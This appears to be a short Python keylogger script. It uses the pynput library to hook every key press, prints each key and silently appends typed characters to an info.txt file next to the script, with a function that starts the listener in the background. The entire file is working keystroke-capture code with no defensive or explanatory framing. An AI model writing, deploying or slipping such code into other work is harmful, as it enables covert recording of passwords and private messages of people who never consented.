import os
from pynput import keyboard
def keyPressed(key):
    print(str(key))
    script_dir = os.path.dirname(os.path.realpath(__file__))  # Get the directory of the current script
    info = os.path.join(script_dir, "info.txt")  # Construct the path to info.txt in the same directory
    with open(info, 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error")

def start_listener():
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()

